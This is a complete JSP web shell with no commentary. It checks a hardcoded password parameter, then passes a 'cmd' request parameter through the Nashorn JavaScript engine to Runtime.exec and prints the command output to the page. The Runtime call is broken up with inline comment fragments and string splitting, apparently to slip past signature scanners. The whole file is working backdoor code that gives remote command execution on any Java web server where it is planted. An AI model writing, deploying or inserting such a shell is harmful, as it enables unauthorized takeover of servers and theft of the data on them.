<%@ page import="java.io.InputStream" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String PASSWORD = "password";
    javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("JavaScript");
    engine.put("request",request);
    String pwd = request.getParameter("pwd");
    if(!pwd.equals(PASSWORD)){
        return;
    }
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("function test(){")
            .append("try {\n")
            .append("  load(\"nashorn:mozilla_compat.js\");\n")
            .append("} catch (e) {}\n")
            .append("importPackage(Packages.java.lang);\n")
            .append("var cmd = request.getParameter(\"cmd\");")
            .append("var x=java/****/.lang./****/Run")
            .append("time./****")
            .append("/getRunti")
            .append("me()/****/.exec(cmd);")
            .append("return x.getInputStream();};")
            .append("test();");
    java.io.InputStream in = (InputStream) engine.eval(stringBuilder.toString());
    StringBuilder outStr = new StringBuilder();
    response.getWriter().print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        outStr.append(s + "\n");
    }
    response.getWriter().print(outStr.toString());
    response.getWriter().print("</pre>");
%>